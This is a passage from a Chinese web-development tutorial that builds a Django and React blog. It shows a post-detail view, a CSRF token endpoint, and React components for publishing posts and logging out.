            }})
        <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
            <span style="color: #a020f0;">return</span> JsonResponse(Messages.BAD_REQUEST)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">getpost</span>(request:HttpRequest, <span style="color: #483d8b;">id</span>:<span style="color: #483d8b;">int</span>):
    <span style="color: #a020f0;">try</span>:
        <span style="color: #a0522d;">post</span> = Post.objects.get(pk=<span style="color: #483d8b;">id</span>)
        <span style="color: #a020f0;">return</span> JsonResponse({<span style="color: #8b2252;">'post'</span>:{
            <span style="color: #8b2252;">'id'</span>:post.pk,
            <span style="color: #8b2252;">'title'</span>:post.title,
            <span style="color: #8b2252;">'postdate'</span>:post.postdate,
            <span style="color: #8b2252;">'author_id'</span>:post.author_id,
            <span style="color: #8b2252;">'author'</span>:post.author.username,
            <span style="color: #8b2252;">'content'</span>:post.content.content
        }})
    <span style="color: #a020f0;">except</span> <span style="color: #228b22;">Exception</span> <span style="color: #a020f0;">as</span> e:
        <span style="color: #483d8b;">print</span>(e)
        <span style="color: #a020f0;">return</span> JsonResponse(Messages.NOT_FOUND)   
</pre>
</div>
</div>
</div>
<div id="outline-container-h:79c1ddf3-5e1b-44f2-a90b-6e464293592f" class="outline-5">
<h5 id="h:79c1ddf3-5e1b-44f2-a90b-6e464293592f">后端-产生cookie</h5>
<div class="outline-text-5" id="text-h:79c1ddf3-5e1b-44f2-a90b-6e464293592f">
<p>
csrf: <a href="https://docs.djangoproject.com/en/5.2/ref/csrf/">https://docs.djangoproject.com/en/5.2/ref/csrf/</a>
</p>

<p>
目前，认证、csrf_protected通用，双cookie验证
</p>
<ol class="org-ol">
<li><p>
如果在浏览器端获取到cookie, csrftoken
</p>

<p>
必须在提交数据前，先获得此cookie，就要先访问一个接口，接口对应一个视图函数，被装饰，保证能返回一个csrftoken的cookie
</p></li>
<li>发送所有的数据，带来cookie带上自定义头，</li>
</ol>

<p>
blog/urls.py 增加获取token函数
</p>
<div class="org-src-container">
<pre class="src src-python"><span style="color: #a020f0;">from</span> django.contrib <span style="color: #a020f0;">import</span> admin
<span style="color: #a020f0;">from</span> django.urls <span style="color: #a020f0;">import</span> path, include
<span style="color: #b22222;"># </span><span style="color: #b22222;">from django.shortcuts import HttpResponse #WSGI&#24555;&#25463;&#26041;&#27861;&#65292;&#36824;&#21487;&#20197;&#20174;django.http&#20013;&#23548;&#20837;</span>
<span style="color: #a020f0;">from</span> django.http <span style="color: #a020f0;">import</span> HttpResponse, HttpRequest, JsonResponse
<span style="color: #a020f0;">from</span> django.template.loader <span style="color: #a020f0;">import</span> get_template
<span style="color: #a020f0;">from</span> django.shortcuts <span style="color: #a020f0;">import</span> render
<span style="color: #b22222;"># </span><span style="color: #b22222;">HttpRequest&#26159;&#29238;&#31867;&#65307;WSGIRequest&#26159;&#23376;&#31867;</span>

<span style="color: #a020f0;">from</span> datetime <span style="color: #a020f0;">import</span> datetime

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">index</span>(request:HttpRequest):
    <span style="color: #a0522d;">context</span> = {
        <span style="color: #8b2252;">'a'</span>:100,
        <span style="color: #8b2252;">'b'</span>:0,
        <span style="color: #8b2252;">'c'</span>:<span style="color: #483d8b;">list</span>(<span style="color: #483d8b;">range</span>(10,20)),
        <span style="color: #8b2252;">'d'</span>:<span style="color: #483d8b;">dict</span>(<span style="color: #483d8b;">zip</span>(<span style="color: #8b2252;">'abcde'</span>,<span style="color: #8b2252;">'ABCDE'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">d.e &#27809;&#25214;&#21040; d['e'] &#27809;&#25214;&#21040; d[e]</span>
        <span style="color: #8b2252;">'s'</span>:<span style="color: #8b2252;">'abcde'</span>,
        <span style="color: #8b2252;">'date'</span>:datetime.now(),
    }
    <span style="color: #b22222;"># </span><span style="color: #b22222;">with open(r'D:\project\pyprojs\trae\blog10\user\index.html', encoding='utf-8') as f:</span>
    <span style="color: #b22222;">#     </span><span style="color: #b22222;">txt = f.read()</span>
    <span style="color: #b22222;">#     </span><span style="color: #b22222;">txt = txt.format(content)</span>
    <span style="color: #a020f0;">return</span> render(request, <span style="color: #8b2252;">'index.html'</span>, {<span style="color: #8b2252;">'mydict'</span>:context}, status=201)

<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">test</span>(request, clz, uid):
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
    <span style="color: #b22222;"># </span><span style="color: #b22222;">print(request.path)</span>
    <span style="color: #483d8b;">print</span>(clz, uid, <span style="color: #483d8b;">type</span>(clz), <span style="color: #483d8b;">type</span>(uid))
    <span style="color: #483d8b;">print</span>(<span style="color: #8b2252;">'='</span>*30)
    <span style="color: #a020f0;">return</span> HttpResponse(<span style="color: #8b2252;">'abc~~~~'</span>)

<span style="color: #a020f0;">from</span> django.views.decorators.csrf <span style="color: #a020f0;">import</span> ensure_csrf_cookie
<span style="color: #228b22;">@ensure_csrf_cookie</span>
<span style="color: #a020f0;">def</span> <span style="color: #0000ff;">get_token</span>(request):
    <span style="color: #a020f0;">return</span> HttpResponse()

<span style="color: #a0522d;">urlpatterns</span> = [
    path(<span style="color: #8b2252;">'gettoken'</span>, get_token), <span style="color: #b22222;"># </span><span style="color: #b22222;">/gettoken &#33719;&#21462;&#19968;&#20010;csrftoken&#30340;cookie</span>
    path(<span style="color: #8b2252;">'admin/'</span>, admin.site.urls),
    path(<span style="color: #8b2252;">''</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/' =&gt; index&#20989;&#25968;</span>
    path(<span style="color: #8b2252;">'index/'</span>, index), <span style="color: #b22222;"># </span><span style="color: #b22222;">'/index' 301 '/index/'; '/index/' OK</span>
    path(<span style="color: #8b2252;">'test/&lt;clz&gt;/&lt;int:uid&gt;'</span>, test), <span style="color: #b22222;"># </span><span style="color: #b22222;">/test/tom/2 &#23454;&#21442;&#27880;&#20837;</span>
    path(<span style="color: #8b2252;">'users/'</span>, include(<span style="color: #8b2252;">'user.urls'</span>)),  <span style="color: #b22222;"># </span><span style="color: #b22222;">/users</span>
    path(<span style="color: #8b2252;">'posts/'</span>, include(<span style="color: #8b2252;">'post.urls'</span>)),  <span style="color: #b22222;"># </span><span style="color: #b22222;">/posts</span>
    path(<span style="color: #8b2252;">'captcha/'</span>, include(<span style="color: #8b2252;">'captcha.urls'</span>)), <span style="color: #b22222;"># </span><span style="color: #b22222;">/captcha/</span>
]
</pre>
</div>

<p>
访问 <a href="http://127.0.0.1:8000/gettoken">http://127.0.0.1:8000/gettoken</a> 接口返回一个csrftoken的cookie值
</p>
</div>
</div>
<div id="outline-container-h:129b0458-7db7-420f-9531-9e973c9f0305" class="outline-5">
<h5 id="h:129b0458-7db7-420f-9531-9e973c9f0305">前端-获取cookie</h5>
<div class="outline-text-5" id="text-h:129b0458-7db7-420f-9531-9e973c9f0305">
<p>
component/pub.js 增加调用获得token  this.props.service.getToken();
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/pub.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { postService as service } from <span style="color: #8b2252;">'../service/post'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;
<span style="color: #a020f0;">import</span> { Form, Input, Button, Modal } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> BraftEditor from <span style="color: #8b2252;">'braft-editor'</span>
<span style="color: #a020f0;">import</span> <span style="color: #8b2252;">'braft-editor/dist/index.css'</span>

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">class</span> _Pub <span style="color: #a020f0;">extends</span> React.Component {

    componentDidMount() {
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#24322;&#27493;&#35774;&#32622;&#32534;&#36753;&#22120;&#20869;&#23481;</span>
        setTimeout(() =&gt; {
            <span style="color: #008b8b;">this</span>.props.form.setFieldsValue({
                content: BraftEditor.createEditorState(<span style="color: #8b2252;">'&lt;p&gt;&#20869;&#23481;&lt;/p&gt;'</span>) <span style="color: #b22222;">// </span><span style="color: #b22222;">&#35774;&#32622;&#32534;&#36753;&#22120;&#21021;&#22987;&#20869;&#23481;</span>
            })
        }, 1000)
        <span style="color: #008b8b;">this</span>.props.service.getToken();
    }
    handleSubmit(e) {
        e.preventDefault(); <span style="color: #b22222;">// </span><span style="color: #b22222;">&#38459;&#27490;&#25552;&#20132;</span>
        <span style="color: #008b8b;">this</span>.props.form.validateFields((err, values) =&gt; {
            <span style="color: #a020f0;">if</span> (!err) {
                console.log(<span style="color: #8b2252;">'&#27809;&#26377;&#38169;&#65292;&#20877;&#30475;'</span>, values.title, values.content.toHTML());
                <span style="color: #008b8b;">this</span>.props.service.pub(values.title, values.content.toHTML());
            }
        });
        <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(e.target);</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">let form = e.target;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">const [title, content] = form;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">console.log(title.value, content.value);</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">this.props.service.pub(title.value, content.value)</span>
    }

    handleOk = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    handleCancel = e =&gt; {
        console.log(e);
        <span style="color: #008b8b;">this</span>.props.service.success = <span style="color: #008b8b;">false</span>;
    };

    render() {
        console.log(<span style="color: #8b2252;">'pub render ~~~~~'</span>)
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">layout</span> = {
            labelCol: { span: 5 },
            wrapperCol: { span: 14 },
        };
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">tailLayout</span> = {
            wrapperCol: { offset: 8, span: 16 },
        };
        <span style="color: #a020f0;">const</span> { getFieldDecorator } = <span style="color: #008b8b;">this</span>.props.form; <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36825;&#21477;&#24456;&#37325;&#35201;</span>
        <span style="color: #b22222;">// </span><span style="color: #b22222;">&#36873;&#25321;&#32534;&#36753;&#22120;&#24037;&#20855;&#26639;&#19978;&#30340;&#25353;&#38062;</span>
        <span style="color: #a020f0;">const</span> <span style="color: #a0522d;">controls</span> = [<span style="color: #8b2252;">'bold'</span>, <span style="color: #8b2252;">'italic'</span>, <span style="color: #8b2252;">'underline'</span>, <span style="color: #8b2252;">'text-color'</span>, <span style="color: #8b2252;">'separator'</span>, <span style="color: #8b2252;">'link'</span>, <span style="color: #8b2252;">'separator'</span>, <span style="color: #8b2252;">'media'</span>]
        <span style="color: #a020f0;">return</span> (
            &lt;div&gt;
                &lt;Modal
                    title=<span style="color: #8b2252;">"&#25104;&#21151;&#25552;&#20132;"</span>
                    visible={<span style="color: #008b8b;">this</span>.props.service.success}
                    onOk={<span style="color: #008b8b;">this</span>.handleOk.bind(<span style="color: #008b8b;">this</span>)}
                    onCancel={<span style="color: #008b8b;">this</span>.handleCancel.bind(<span style="color: #008b8b;">this</span>)}&gt;
                    &lt;p&gt;&#26159;&#21542;&#36339;&#36716;&#21040;&#35813;&#20869;&#23481;&#30340;&#39029;&#38754;&#65311;&lt;/p&gt;
                &lt;/Modal&gt;
                &lt;Form {...layout} onSubmit={<span style="color: #008b8b;">this</span>.handleSubmit.bind(<span style="color: #008b8b;">this</span>)}&gt;
                    &lt;Form.Item label=<span style="color: #8b2252;">"&#26631;&#39064;"</span>&gt;
                        {
                            getFieldDecorator(<span style="color: #8b2252;">'title'</span>, {
                                rules: [
                                    { required: <span style="color: #008b8b;">true</span>, message: <span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> },
                                    { min: 2, message: <span style="color: #8b2252;">'&#26631;&#39064;&#33267;&#23569;&#24212;&#35813;&#26377;2&#20010;&#23383;'</span> }
                                ],
                            })(&lt;Input placeholder=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#26631;&#39064;'</span> /&gt;)
                        }
                    &lt;/Form.Item&gt;
                    &lt;Form.Item label=<span style="color: #8b2252;">"&#25991;&#31456;&#27491;&#25991;"</span>&gt;
                        {
                            getFieldDecorator(<span style="color: #8b2252;">'content'</span>, {
                                validateTrigger: <span style="color: #8b2252;">'onBlur'</span>,
                                rules: [{
                                    required: <span style="color: #008b8b;">true</span>,
                                    validator: (_, value, callback) =&gt; {
                                        <span style="color: #a020f0;">if</span> (value.isEmpty()) {
                                            callback(<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#27491;&#25991;&#20869;&#23481;'</span>)
                                        } <span style="color: #a020f0;">else</span> {
                                            callback()
                                        }
                                    }
                                }],
                            })(&lt;BraftEditor
                                className=<span style="color: #8b2252;">'my-editor'</span>
                                controls={controls}
                                placeholder=<span style="color: #8b2252;">'&#35831;&#36755;&#20837;&#27491;&#25991;&#20869;&#23481;'</span>
                            /&gt;
                            )
                        }
                    &lt;/Form.Item&gt;
                    &lt;Form.Item wrapperCol={{ span: 12, offset: 5 }}&gt;
                        &lt;Button type=<span style="color: #8b2252;">"primary"</span> htmlType=<span style="color: #8b2252;">"submit"</span>&gt;
                            &#21457;&#24067;
                        &lt;/Button&gt;
                    &lt;/Form.Item&gt;
                &lt;/Form&gt;
            &lt;/div&gt;
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Pub</span> = Form.create()(_Pub); <span style="color: #b22222;">// </span><span style="color: #b22222;">_Pub&#32452;&#20214;&#23601;&#26377;&#20102;this.props.form</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> Pub;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:7c611c4b-1b18-4a59-a422-15f9d6edd16a" class="outline-5">
<h5 id="h:7c611c4b-1b18-4a59-a422-15f9d6edd16a">前端-服务层改进</h5>
<div class="outline-text-5" id="text-h:7c611c4b-1b18-4a59-a422-15f9d6edd16a">
<p>
AJAX : <a href="https://docs.djangoproject.com/en/3.2/ref/csrf/#ajax">https://docs.djangoproject.com/en/3.2/ref/csrf/#ajax</a>
</p>
<ul class="org-ul">
<li>js-cookie: <a href="https://github.com/js-cookie/js-cookie/">https://github.com/js-cookie/js-cookie/</a></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">yarn add js-cookie
</pre>
</div>

<p>
service/post.js 服务层代码中增加两个特殊的头部。
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">service/post.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> axios from <span style="color: #8b2252;">"../axios"</span>;
<span style="color: #a020f0;">import</span> { observable } from <span style="color: #8b2252;">"mobx"</span>;
<span style="color: #a020f0;">import</span> { message } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Cookies from <span style="color: #8b2252;">'js-cookie'</span>;

<span style="color: #a020f0;">class</span> PostService {
    @observable success = <span style="color: #008b8b;">false</span>;

    pub(title, content) {
        console.log(<span style="color: #8b2252;">'&#21435;&#22788;&#29702;'</span>, title, content); <span style="color: #b22222;">// </span><span style="color: #b22222;">Ajax axios xmlhttprequest</span>

        axios.post({
            url:<span style="color: #8b2252;">'/posts/'</span>,
            data:{title, content},
            config: {
                headers: {<span style="color: #8b2252;">'X-CSRFToken'</span>: Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>)} <span style="color: #b22222;">// </span><span style="color: #b22222;">&#26412;&#22495; HTTP_X_CSRFTOKEN</span>
            }
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#20102;&#65281;&#65281;&#65281;&#65281;'</span>, value)
                message.info(<span style="color: #8b2252;">'&#21338;&#25991;&#25552;&#20132;&#25104;&#21151;'</span>);
                <span style="color: #b22222;">// </span><span style="color: #b22222;">&#22686;&#24378;&#65292;&#30830;&#35748;&#26159;&#21542;&#36339;&#36716;</span>
                <span style="color: #008b8b;">this</span>.success = <span style="color: #008b8b;">true</span>;
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }

    getToken() {
        axios.get({
            url:<span style="color: #8b2252;">'/gettoken'</span>,
        }).then(
            value =&gt; {
                console.log(<span style="color: #8b2252;">'&#25104;&#21151;&#33719;&#21462;token'</span>, Cookies.get(<span style="color: #8b2252;">'csrftoken'</span>))
            },
            reason =&gt; {
                console.log(reason);
                message.warning(reason.msg || <span style="color: #8b2252;">'&#38169;&#35823;&#65292;&#35831;&#32852;&#31995;&#31649;&#29702;&#21592;'</span>);
            }
        );
    }
}

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">postService</span> = <span style="color: #a020f0;">new</span> <span style="color: #228b22;">PostService</span>();
<span style="color: #a020f0;">export</span> {postService}
</pre>
</div>

<p>
测试发布文章。
</p>
</div>
</div>
</div>
<div id="outline-container-h:d9ce7d19-a1dd-4209-a10a-f53f0be204ed" class="outline-4">
<h4 id="h:d9ce7d19-a1dd-4209-a10a-f53f0be204ed">登出</h4>
<div class="outline-text-4" id="text-h:d9ce7d19-a1dd-4209-a10a-f53f0be204ed">
<p>
设置profile组件页面, 包含登出连接
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/component/profile.js&#25991;&#20214;&#20869;&#23481;</span><span style="color: #b22222;"> */</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { Link, Redirect } from <span style="color: #8b2252;">'react-router-dom'</span>;
<span style="color: #a020f0;">import</span> { userService as service } from <span style="color: #8b2252;">'../service/user'</span>;
<span style="color: #a020f0;">import</span> { observer } from <span style="color: #8b2252;">'mobx-react'</span>;
<span style="color: #a020f0;">import</span> { inject } from <span style="color: #8b2252;">'../utils'</span>;

@inject({ service })
@observer <span style="color: #b22222;">// </span><span style="color: #b22222;">observer &#24517;&#39035;&#32039;&#32039;&#38752;&#30528;&#32452;&#20214;</span>
<span style="color: #a020f0;">export</span> <span style="color: #a020f0;">default</span> <span style="color: #a020f0;">class</span> Profile <span style="color: #a020f0;">extends</span> React.Component {
    constructor(props) {
        <span style="color: #a020f0;">super</span>(props);
    }

    handleClick(event) {
        event.preventDefault();
        <span style="color: #008b8b;">this</span>.props.service.logout();
    }

    render() {
        console.log(<span style="color: #8b2252;">'profile render ~~~~~'</span>)
        <span style="color: #a020f0;">if</span> (!<span style="color: #008b8b;">this</span>.props.service.isLogin) {
            <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Redirect</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">'/login'</span> /&gt;
        }
        <span style="color: #a020f0;">return</span> (
            &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#29992;&#25143;&#20449;&#24687;: </span>&lt;<span style="color: #0000ff;">br</span> /&gt;&lt;<span style="color: #0000ff;">a</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick.bind(<span style="color: #008b8b;">this</span>)}&gt;<span style="color: #000000; background-color: #ffffff;">[&#30331;&#20986;]</span>&lt;/<span style="color: #0000ff;">a</span>&gt;&lt;/<span style="color: #0000ff;">h2</span>&gt;
        );
    }
}
</pre>
</div>

<p>
src/index.js 将/profile转到profile页面
</p>
<div class="org-src-container">
<pre class="src src-js"><span style="color: #b22222;">/*</span><span style="color: #b22222;">src/index.js</span><span style="color: #b22222;">*/</span>
<span style="color: #a020f0;">import</span> React from <span style="color: #8b2252;">'react'</span>;
<span style="color: #a020f0;">import</span> { render } from <span style="color: #8b2252;">'react-dom'</span>;
<span style="color: #a020f0;">import</span> { BrowserRouter as Router, Switch, Route, Link } from <span style="color: #8b2252;">"react-router-dom"</span>;
<span style="color: #a020f0;">import</span> Login from <span style="color: #8b2252;">'./component/login'</span>;
<span style="color: #a020f0;">import</span> Reg from <span style="color: #8b2252;">'./component/reg'</span>;
<span style="color: #a020f0;">import</span> Pub from <span style="color: #8b2252;">'./component/pub'</span>;

<span style="color: #a020f0;">import</span> { Menu, Icon, Layout } from <span style="color: #8b2252;">'antd'</span>;
<span style="color: #a020f0;">import</span> Profile from <span style="color: #8b2252;">'./component/profile'</span>;
<span style="color: #a020f0;">const</span> { Header, Content, Footer } = Layout;

<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Home</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">Home</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">About</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">About</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Default</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#32570;&#30465;&#26174;&#31034;</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;
<span style="color: #a020f0;">const</span> <span style="color: #a0522d;">Always</span> = props =&gt; &lt;<span style="color: #0000ff;">h2</span>&gt;<span style="color: #000000; background-color: #ffffff;">blog &#169;2008 Created by Jasper</span>&lt;/<span style="color: #0000ff;">h2</span>&gt;;

<span style="color: #a020f0;">class</span> App <span style="color: #a020f0;">extends</span> React.Component {
  state = {
    current: <span style="color: #8b2252;">'home'</span>,
  };

  handleClick = e =&gt; {
    console.log(<span style="color: #8b2252;">'click '</span>, e);
    <span style="color: #008b8b;">this</span>.setState({
      current: e.key,
    });
  };
  render() {
    <span style="color: #a020f0;">return</span> &lt;<span style="color: #0000ff;">Router</span>&gt;
<span style="color: #000000; background-color: #ffffff;">      </span>&lt;<span style="color: #0000ff;">Layout</span> <span style="color: #a0522d;">className</span>=<span style="color: #8b2252;">"layout"</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">Menu</span> <span style="color: #a0522d;">onClick</span>={<span style="color: #008b8b;">this</span>.handleClick}
            <span style="color: #a0522d;">theme</span>=<span style="color: #8b2252;">"dark"</span>
            <span style="color: #a0522d;">mode</span>=<span style="color: #8b2252;">"horizontal"</span>
            <span style="color: #a0522d;">defaultSelectedKeys</span>={[<span style="color: #008b8b;">this</span>.state.current]}
            <span style="color: #a0522d;">style</span>={{ lineHeight: <span style="color: #8b2252;">'64px'</span> }}
          <span style="color: #b22222;">// </span><span style="color: #a0522d;">selectedKeys</span><span style="color: #b22222;">={[this.state.current]}</span>
          &gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"home"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"home"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20027;&#39029;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"login"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/login"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"login"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#30331;&#24405;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"reg"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/reg"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"form"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#27880;&#20876;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"pub"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/pub"</span>&gt;&lt;<span style="color: #0000ff;">Icon</span> <span style="color: #a0522d;">type</span>=<span style="color: #8b2252;">"edit"</span> /&gt;<span style="color: #000000; background-color: #ffffff;">&#20889;&#21338;&#23458;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Menu.Item</span> <span style="color: #a0522d;">key</span>=<span style="color: #8b2252;">"about"</span>&gt;&lt;<span style="color: #0000ff;">Link</span> <span style="color: #a0522d;">to</span>=<span style="color: #8b2252;">"/about"</span>&gt;<span style="color: #000000; background-color: #ffffff;">&#20851;&#20110;</span>&lt;/<span style="color: #0000ff;">Link</span>&gt;&lt;/<span style="color: #0000ff;">Menu.Item</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">Menu</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Header</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Content</span> <span style="color: #a0522d;">style</span>={{ padding: <span style="color: #8b2252;">'10px 50px'</span> }}&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;<span style="color: #0000ff;">div</span> <span style="color: #a0522d;">style</span>={{ background: <span style="color: #8b2252;">'#fff'</span>, padding: 24, minHeight: 280 }}&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">exact</span> <span style="color: #a0522d;">path</span>={[<span style="color: #8b2252;">"/"</span>, <span style="color: #8b2252;">'/index'</span>]} <span style="color: #a0522d;">component</span>={Home}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/login"</span> <span style="color: #a0522d;">component</span>={Login}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/reg"</span> <span style="color: #a0522d;">component</span>={Reg}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/about"</span> <span style="color: #a0522d;">component</span>={About}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/profile"</span> <span style="color: #a0522d;">component</span>={Profile}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">path</span>=<span style="color: #8b2252;">"/pub"</span> <span style="color: #a0522d;">component</span>={Pub}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">              </span>&lt;<span style="color: #0000ff;">Route</span> <span style="color: #a0522d;">component</span>={Default}&gt;&lt;/<span style="color: #0000ff;">Route</span>&gt;
<span style="color: #000000; background-color: #ffffff;">            </span>&lt;/<span style="color: #0000ff;">Switch</span>&gt;
<span style="color: #000000; background-color: #ffffff;">          </span>&lt;/<span style="color: #0000ff;">div</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;/<span style="color: #0000ff;">Content</span>&gt;
<span style="color: #000000; background-color: #ffffff;">        </span>&lt;<span style="color: #0000ff;">Footer</span> <span style="color: #a0522d;">style</span>={{ textAlign: <span style="color: #8b2252;">'center'</span> }}&gt;
